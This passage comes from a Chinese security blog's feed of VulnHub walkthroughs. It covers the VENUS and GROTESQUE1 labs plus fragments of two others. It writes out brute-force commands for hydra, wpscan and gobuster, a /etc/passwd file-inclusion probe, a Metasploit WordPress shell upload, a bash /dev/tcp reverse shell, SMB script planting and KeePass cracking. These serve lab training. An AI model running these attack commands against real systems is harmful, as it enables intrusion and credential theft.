md5sum<br>\nJohn 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/directory –fork =2</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-871.png\" width=\"600\" alt=\"Image\">\n<p>抓取网站的数据包，通过 burp 代理浏览器数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-872.png\" width=\"470\" alt=\"Image\">\n<p>设置攻击类型为 Cluster bomb，即两个字段采用两个不同的字典，第一个字段填一个比较常用的爆破字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-873.png\" width=\"380\" alt=\"Image\">\n<p>第二个字典填一个经常用的后缀，如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-874.png\" width=\"360\" alt=\"Image\">\n<p>并且采用 md5 加密对自己的 payload 进行加密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-875.png\" width=\"470\" alt=\"Image\">\n<p>注意要对第一个字段 md5 加密，第二个字段不加密，按此方法爆破即可</p>\n<p>还有另外一种爆破方式，是通过 linux 命令生成批量的 md5 加密的字典<br>\n <code>for i in $(cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt); do echo $i;echo $i | md5sum &gt;&gt; dirscroty_md5.txt; done</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-876.png\" width=\"700\" alt=\"Image\">\n<p>生成的字典显示如下，每一行的最后面都有一个横线</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-877.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"利用vim自定义txt\"><a class=\"markdownIt-Anchor\" href=\"#利用vim自定义txt\">#</a> 利用 vim 自定义 txt</h3>\n<p>输入:% s#-##g 即可以批量清除横线</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-878.png\" width=\"270\" alt=\"Image\">\n<p>此时的字典已经显示为正常，可用此 md5 加密字典进行爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-879.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"爆破-md5-目录\"><a class=\"markdownIt-Anchor\" href=\"#爆破-md5-目录\">#</a> 爆破 md5 目录</h3>\n<p>用 gobuster 加载此字典进行目录的搜集<br>\n <code>gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium-md5.txt -u http://192.168.31.63/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-880.png\" width=\"700\" alt=\"Image\">\n<p>找到了一个敏感的地址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjQyL2Y2NmIyMmJmMDIwMzM0YjA0YzdkMGQzZWI1MDEwMzkxLnBocA==\">http://192.168.31.242/f66b22bf020334b04c7d0d3eb5010391.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-881.png\" width=\"520\" alt=\"Image\">\n<p>看来是有一些参数在这个 url 地址后边</p>\n<h3 id=\"wfuzz爆破http参数\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz爆破http参数\">#</a> wfuzz 爆破 http 参数</h3>\n<p>用 wfuzz 爆破 http 参数<br>\n <code>wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &quot;http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd&quot; -c --hh 0 -t 32 --hc 404,403</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-882.png\" width=\"700\" alt=\"Image\">\n<p>找到了一个 pupose 时返回 200 的代码，打开目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjMvZjY2YjIyYmYwMjAzMzRiMDRjN2QwZDNlYjUwMTAzOTEucGhwP3B1cnBvc2U9L2V0Yy9wYXNzd2Q=\">http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-883.png\" width=\"700\" alt=\"Image\">\n<p>发现了敏感文件泄漏，检查源代码可以看到格式比较标准的文件，</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-884.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 发现存在 freddie 和 root 两个用户</p>\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p>目前只能收集到上述一个用户名的信息，密码没有，尝试 hydra 爆破，由于之前采用的是 md5 加密的目录才搜索到的网址，这里对正常的字典扫描了，一遍之后并没有发现，于是猜测用 md5 加密字典对 ssh 密码扫描</p>\n<p><code>hydra -l freddie -P g3.txt ssh://192.168.31.63 -f -t 32 -I -o hydra.ssh</code></p>\n<p>-&gt; 扫描到用户 freddie 的密码是 61a4e3e60c063d1e472dd780f64e6cad</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-885.png\" width=\"700\" alt=\"Image\">\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmZyZWRkaWVAMTkyLjE2OC4zMS42Mw==\">freddie@192.168.31.63</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-886.png\" width=\"530\" alt=\"Image\">\n<h3 id=\"上传shellsh到smb\"><a class=\"markdownIt-Anchor\" href=\"#上传shellsh到smb\">#</a> 上传 shell.sh 到 smb</h3>\n<p>看到有一个 445 端口正在执行，445 是 smb 协议</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-887.png\" width=\"660\" alt=\"Image\">\n<p>看看共享文件夹中的内容  <code>smbclient -N -L 127.0.0.1</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-888.png\" width=\"420\" alt=\"Image\">\n<p>其中带 $ 的是管理员才能进入的目录，发现可直接访问的 grotesque 目录</p>\n<p>连接到共享文件夹中  <code>smbclient \\\\\\\\127.0.0.1\\\\grotesque</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-889.png\" width=\"520\" alt=\"Image\">\n<p>没有什么敏感文件，给服务器下载一个 pyps64s 进行监控，看会不会执行 smb 中的文件</p>\n<p>发现每隔一段时间会执行 smb 中的可执行文件，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zaGVsbC1mZzFoeWp5OHdzc3Iuc2g=\"> 准备一个 shell.sh</span>，尝试上传到 smb 中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-890.png\" width=\"520\" alt=\"Image\">\n<p>将 shell.sh 中的内容复制，粘贴到靶机上边，将靶机上的 shell.sh 中的内容上传到 smb 服务中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-891.png\" width=\"420\" alt=\"Image\">\n<p>监听 shell，等待反弹，pspy 监控到执行，同时得到了 root 的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-892.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 拿到了 root 的权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/137%20VENUS/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/137%20VENUS/",
            "title": "VULNHUB 37 VENUS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtdmVudXMsNzA1Lw==\">https://www.vulnhub.com/entry/the-planets-venus,705/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 VENUS：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n <code>sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep 'a0' &gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk '&#123;print$1&#125;' &gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-991.png\">\n<p>-&gt; 靶机 ip：192.168.31.12 靶机开放端口 22,8080</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=\">http://192.168.31.12:8080/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-992.png\" width=\"320\" alt=\"Image\">\n<p>给出了 guest:guest 的账户和密码，直接进入该网站</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-993.png\" width=\"700\" alt=\"Image\">\n<p>查看了一下，翻了翻源代码没有发现敏感信息</p>\n<p>用 gobuster 进行爆破:<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12:8080/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-994.png\">\n<p>-&gt; 关键目录 /admin</p>\n<h3 id=\"存储-cookies-泄露\"><a class=\"markdownIt-Anchor\" href=\"#存储-cookies-泄露\">#</a> 存储 cookies 泄露</h3>\n<p>进入 admin 页面，检查页面是否存储 cookies 信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-995.png\" width=\"550\" alt=\"Image\">\n<p>将 auth 认证信息解密出来后发现是 guest:thrfg</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-996.png\" width=\"320\" alt=\"Image\">\n<p>意味着我们登陆 guest 用户，页面就会存储 guest 用户的相关票据，但是凭借此用户密码是无法登陆到网站后台的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-997.png\" width=\"420\" alt=\"Image\">\n<p>是不是有可能还有其他的登陆用户，我们将 google 存储在此页面的 cookie 信息清除</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-998.png\" width=\"700\" alt=\"Image\">\n<p>重新回到登陆页面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-999.png\" width=\"370\" alt=\"Image\">\n<p>-&gt; 下一步的目标转化为爆破此页面的用户名和密码</p>\n<h3 id=\"burp-爆破登陆框\"><a class=\"markdownIt-Anchor\" href=\"#burp-爆破登陆框\">#</a> burp 爆破登陆框</h3>\n<blockquote>\n<p>但是如果没有什么规律的话， 1000 行大小的字典爆破，需要 1000*1000 次的爆破次数，因为用户名和密码都有可能是这 1000 个种的任意一个<br>\n输入一个错误的用户名看页面回显，看到了 Invalid username 的信息，于是乎我们可以先随便写一个密码，先爆破出用户名有哪些，有的话在依据此用户名爆破其密码</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1000.png\" width=\"320\" alt=\"Image\">\n<p>顺便测一下输入正确的用户名，错误的密码的时候，页面的回显结果。发现有 Invalid password 的字段，可以据此信息判断页面是否能登陆成功。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1001.png\" width=\"320\" alt=\"Image\">\n<p>现在我们就通过爆破用户名的方式进入该网站，可以通过 burp 和 hydra 进行爆破。采用 burp 的方式需要先将浏览器数据进行代理。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1002.png\" width=\"620\" alt=\"Image\">\n<p>将用户名设置为变量，密码设置为固定值进行爆破，由于默认给出的账户名和密码都是 guest 是一样的，这里我就直接通过将 username 和 password 的字段设置为一致来爆破。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1003.png\" width=\"500\" alt=\"Image\">\n<p>选取合适的字典如下，开始爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1004.png\" width=\"480\" alt=\"Image\">\n<p>爆破成功后得到了 venus 用户是该网站的用户。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1005.png\" width=\"500\" alt=\"Image\">\n<p>接下来应该将 venus 作为固定用户名，测试其密码为多少。</p>\n<h3 id=\"hydra-爆破登陆框\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破登陆框\">#</a> hydra 爆破登陆框</h3>\n<p>或者用 hydra 的方式爆破用户名和密码<br>\n <code>hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &quot;/:username=^USER^&amp;password^PASS^:Invalid username.&quot;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1006.png\">\n<p>-&gt; 测试得到了三个用户分别是 guest，venus，magellan</p>\n<blockquote>\n<p>爆破用户名的阶段是比较漫长的，虽然可以用 hydra 的 - t 参数指定最大线程为 64 ，但是还是需要很长时间才能爆破出三个用户名的，这里为了尽快达到效果，我用了 vim 将字典进行了修改。<br>\n单单依据上面的思路继续下去，需要对三个用户分别进行爆破，guest 和 venus 比较好爆破，经过一段时间的爆破发现这两个用户名的密码就是其用户名。但如果这个密码是比较复杂的也是很难爆破出来的。</p>\n</blockquote>\n<h3 id=\"数据包规律\"><a class=\"markdownIt-Anchor\" href=\"#数据包规律\">#</a> 数据包规律</h3>\n<p>登陆 guest:guest，拦截浏览器数据，发现页面自动存储了 cookie 的信息。解密之后为 guest:thrfg, 前者是用户名，后者并不是密码，但可能是密码的另一种加密方式。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1007.png\">\n<p>登陆 venus:venus，拦截浏览器数据，找到 cookie，解密后的凭据为 venus:irahf</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1008.png\">\n<p>我们继续清除浏览器存储的 cookie 信息，用正确的用户名和一个虚假的密码尝试登陆，并用 burp 做代理拦截流量，发现页面给我们回复了一个加密密文。解密后得到了 magellan:irahfvnatrbybtl1989</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1009.png\">\n<p>综上，我们得到了三组数据，分别是</p>\n<p><code>guest:thrfg</code>   <code>venus:irahf</code>   <code>magellan:irahfvnatrbybtl1989</code></p>\n<h3 id=\"凯撒解密\"><a class=\"markdownIt-Anchor\" href=\"#凯撒解密\">#</a> 凯撒解密</h3>\n<p>观察得知，好像就是一个字符的偏移加密，这就是凯撒加密无疑了，但是具体偏移多少位还需要一一尝试，在下面网址中依次按不同的偏移量进行解密:<span class=\"exturl\" data-url=\"aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw\">http://moersima.00cha.net/kaisamima.asp</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1010.png\" width=\"390\" alt=\"Image\">\n<p>最终得到了加密方式为凯撒偏移 13 的加密，并且三位用户名密码均得到了。</p>\n<p>ssh 成功拿到了 magellan 的权限，得到了其 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1011.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"pkexec-提权\"><a class=\"markdownIt-Anchor\" href=\"#pkexec-提权\">#</a> pkexec 提权</h3>\n<p>看了一眼服务器存在 pkexec 的，并且有 s 权限，而且存在 gcc 编译器的，直接利用此进行提权</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1012.png\" width=\"500\" alt=\"Image\">\n<p>将 pkexec 的利用脚本发送至对方服务器，编译运行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1013.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/136%20GROTESQUE1/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/136%20GROTESQUE1/",
            "title": "VULNHUB 36 GROTESQUE1",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTEwMSw2NTgv\">https://www.vulnhub.com/entry/grotesque-101,658/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BlcnBldHVhbF9CbHVlL2FydGljbGUvZGV0YWlscy8xMjQ1NDE4OTM=\">https://blog.csdn.net/Perpetual_Blue/article/details/124541893</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 GROTESQUE1：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n <code>sudo arp-scan -l &gt; 1.txt ; cat 1.txt | grep 'a0' &gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk '&#123;print$1&#125;' &gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-950.png\">\n<p>-&gt; 靶机 ip：192.168.31.29、靶机开放端口 80</p>\n<p>2 ）再次确认开放端口</p>\n<p>识别到的 80 端口，没有其他的端口，感觉是有问题的，因为这种情况很少能侵入到系统，需要再次进行扫描判断结果是否正确</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-951.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 66,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjk=\">http://192.168.31.29</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-952.png\" width=\"440\" alt=\"Image\">\n<p>目录扫描:  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.29</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-953.png\">\n<p>-&gt; 80 端口可以放弃了，开始把目标放在 66 端口上</p>\n<h3 id=\"智力游戏解谜1\"><a class=\"markdownIt-Anchor\" href=\"#智力游戏解谜1\">#</a> 智力游戏解谜 1</h3>\n<p>打开 http://192.168.31.29:66/ 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-954.png\" width=\"620\" alt=\"Image\">\n<p>看到有个地址可以直接下载项目地址，这里我们直接点击下载</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-955.png\" width=\"620\" alt=\"Image\">\n<p>这么多文件，一眼看去只有几个是 1.18 号的文件，先对这几个文件测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-956.png\" width=\"700\" alt=\"Image\">\n<p>按日期这一列对这些文件进行排序，输入如下命令  <code>ls -Alh | sort -k 7</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-957.png\" width=\"520\" alt=\"Image\">\n<p>接下来就依次看看这几个文件  <code>cat assets/* | sort | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-958.png\" width=\"520\" alt=\"Image\">\n<p>一堆乱码，是没有价值的信息 <code>cat index.md</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-959.png\" width=\"520\" alt=\"Image\">\n<p>这个文件没有有价值的信息 <code>cat _vvmlist | sort | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-960.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 在这个文件中找到了一个 wordpress 的站点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-961.png\" width=\"320\" alt=\"Image\">\n<h3 id=\"wordpress-渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#wordpress-渗透测试\">#</a> wordpress 渗透测试</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZw==\">http://192.168.31.29/lyricsblog</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-962.png\" width=\"700\" alt=\"Image\">\n<p>直接用 wpscan 工具对 wordpress 站点进行扫描<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -e</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-963.png\" width=\"700\" alt=\"Image\">\n<p>得到一个用户名 erdalkomurcu</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-964.png\" width=\"700\" alt=\"Image\">\n<p>指定用户为 erdalkomurcu 进行密码爆破</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -U erdalkomurcu -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-965.png\" width=\"700\" alt=\"Image\">\n<p>密码爆破了很长时间都没成功，可能是一个复杂密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-966.png\" width=\"700\" alt=\"Image\">\n<p>从工具出发没有找到，那么我们就从常规的目录扫描进行测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-967.png\" width=\"700\" alt=\"Image\">\n<p>一些常规的目录，没有什么特殊的，就是有一个 login 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-968.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 既然工具和目录扫描都没有发现可疑的信息，可以尝试去检查一些源代码，看看靶机作者有没有遗留一些提示给我们</p>\n<h3 id=\"智力游戏解谜2\"><a class=\"markdownIt-Anchor\" href=\"#智力游戏解谜2\">#</a> 智力游戏解谜 2</h3>\n<p>查看 wordpress 首页的源代码 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy8=\">http://192.168.31.19/lyricsblog/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-969.png\" width=\"520\" alt=\"Image\">\n<p>访问这个网址，得到一个文件: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy95ZXNtYW4ucG5n\">http://192.168.31.29/lyricsblog/yesman.png</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-970.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>线索到这里就断了，这个图片并没有什么利用价值。但是我们可以肯定的是，线索一定是存在在 wordpres 这个站点上的。接下来我们就手动翻一翻网页，看面有没有什么线索。观察上边的图片，对比在站点上找到的页面，发现了一个巧合点，此图片顶头有个 YES,I ENJOY HAKAN TASIYAN, 网页上有一段标题为 Hakan Taşıyan – Doktor 可能突破点就在于这个点。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-971.png\" width=\"620\" alt=\"Image\">\n<p>进到这个页面之后，这里有三段文字</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-972.png\" width=\"620\" alt=\"Image\">\n<p>是不是有联系，将不带标题的段落文本复制到文本文件中并保存，计算并检查 MD5 消息摘要</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-973.png\" width=\"440\" alt=\"Image\">\n<p>在后台处尝试登陆，用户名为 wpscan 破解出来的，密码就用此 md5 数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-974.png\" width=\"520\" alt=\"Image\">\n<p>登陆失败，将 md5 数据由小写变为大写再次尝试</p>\n<p><code>cat md5.txt | awk '&#123;print toupper($0)&#125;' &gt;&gt; MD5.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-975.png\" width=\"450\" alt=\"Image\">\n<p>再次登陆此网址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy93cC1sb2dpbi5waHA=\">http://192.168.31.19/lyricsblog/wp-login.php</span><br>\n 由密码 BC78C6AB38E114D6135409E44F7CDDA2 成功进入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-976.png\" width=\"250\" alt=\"Image\">\n<p>后台页面显示如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-977.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"msf攻击wordpress\"><a class=\"markdownIt-Anchor\" href=\"#msf攻击wordpress\">#</a> msf 攻击 wordpress</h3>\n<p>可以搜索 wordpress 相关版本查看相关漏洞，查看版本之后用 msf 反弹 shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password BC78C6AB38E114D6135409E44F7CDDA2</span><br><span class=\"line\">set rhosts 192.168.31.29</span><br><span class=\"line\">set username erdalkomurcu</span><br><span class=\"line\">set targeturi /lyricsblog</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-978.png\" width=\"700\" alt=\"Image\">\n<p>options 检查如下参数</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-979.png\" width=\"700\" alt=\"Image\">\n<p>run 开始执行 wordpress 的攻击，成功拿到靶机的 webshell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-980.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"meterpreter反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#meterpreter反弹shell\">#</a> meterpreter 反弹 shell</h3>\n<p>将 msf 的 shell 反弹出来进行美化便于操作<br>\n <code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31.75/4445 0&gt;&amp;1'</code> <br>\n <code>nc -lvvp 4445</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-981.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"keepass-密码破解\"><a class=\"markdownIt-Anchor\" href=\"#keepass-密码破解\">#</a> keepass 密码破解</h3>\n<p>翻阅服务器的相关文件，看到 config 配置文件，找到了数据库用户名和密码，并且 /etc/passwd 中是用 raphael 这个用户的  <code>su raphael:_double_trouble_</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-982.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>注意到此用户根目录下有一个隐藏文件.chadroot.kdbx,KeePass 是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。您可以将所有密码存储在一个数据库中，该数据库由主密钥锁定。因此，您只需记住一个主密钥即可解锁整个数据库。数据库文件使用目前已知的最佳和最安全的加密算法（AES- 256 、ChaCha20 和 Twofish）进行加密。</p>\n</blockquote>\n<p>Keepass 存在漏洞，把其传到 kali 机器上，有多种传输方式</p>\n<ul>\n<li>scp  <code>scp -P22 parallels@192.168.31.73:/home/parallels/Desktop/tmp/.chadroot.kdbx .</code></li>\n</ul>\n<img data-src=\"/N1h1l157/VULNHUB/image-983.png\" width=\"700\" alt=\"Image\">\n<ul>\n<li>nc  <code>nc 192.168.31.73 4446 &lt; .chadroot.kdbx</code></li>\n</ul>\n<img data-src=\"/N1h1l157/VULNHUB/image-984.png\" width=\"470\" alt=\"Image\">\n<ul>\n<li>wget  <code>python3 -m http.server 8000</code>   <code>wget 192.168.31.29/.chadroot.kdbx -O 2.kdbx</code></li>\n</ul>\n<img data-src=\"/N1h1l157/VULNHUB/image-985.png\" width=\"700\" alt=\"Image\">\n<p>用 keepass2john 将 kdbx 后缀的文件转化为 john 能破解的格式并破解</p>\n<p><code>keepass2john .chadroot.kdbx &gt; chadroot</code> <br>\n <code>john --wordlist=/usr/share/wordlists/rockyou.txt chadroot</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-986.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 此处破解的密码应该是：chatter</p>\n<p>登陆网站 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAua2Vld2ViLmluZm8v\">https://app.keeweb.info/</span> 输入 chatter 进入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-987.png\" width=\"620\" alt=\"Image\">\n<p>得到如下界面，每一个页面里边都有一个 root 对应的密码，这四个密码分别是<br>\n <code>.:.yarak.:.</code>   <code>sercertservice</code>   <code>.:.subjective.:.</code>   <code>rockyou.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-988.png\" width=\"620\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-989.png\" width=\"620\" alt=\"Image\">\n<p>在服务器里边分别尝试这四个 root 的密码是否正确</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-990.png\" width=\"370\" alt=\"Image\">\n<p>-&gt; 输入密码.:.subjective.:. 时成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/140%20LOOZ/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/140%20LOOZ/",
            "title": "VULNHUB 40 LOOZ",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbG9vei0xLDczMi8=\">https://www.vulnhub.com/entry/looz-1,732/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9uZXBjb2RleC5jb20vMjAyMS8wOC93YWxrdGhyb3VnaC1vZi1sb296LWZyb20tdnVsbmh1Yi13cml0ZXVwLw==\">https://nepcodex.com/2021/08/walkthrough-of-looz-from-vulnhub-writeup/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 LOOZ：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | 